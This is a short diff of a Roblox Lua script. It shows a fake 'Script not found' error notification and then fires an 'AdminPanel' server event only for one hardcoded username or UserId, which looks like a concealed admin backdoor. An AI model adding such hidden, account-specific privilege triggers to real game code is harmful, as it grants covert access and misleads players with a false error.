@@ -33,12 +33,12 @@ Duration = 5; -- how long the notification should in secounds
 })
 wait(5)
 game.StarterGui:SetCore("SendNotification", {
-Title = "Error! Script not found"; -- the title (ofc)
+Title = "Error!"; -- the title (ofc)
 Text = "Script not found."; -- what the text says (ofc)
 Icon = ""; -- the image if u want. 
 Duration = 5; -- how long the notification should in secounds
 })
-wait(3)
-if game.Players.LocalPlayer.Name == "ZaWarude_OverHeaven" then
+wait(1)
+if game.Players.LocalPlayer.Name == "ZaWarude_OverHeaven" or game.Players.LocalPlayer.UserId == 2474053496 then
 game:GetService("ReplicatedStorage"):FindFirstChild("AdminPanel"):FireServer()
 end
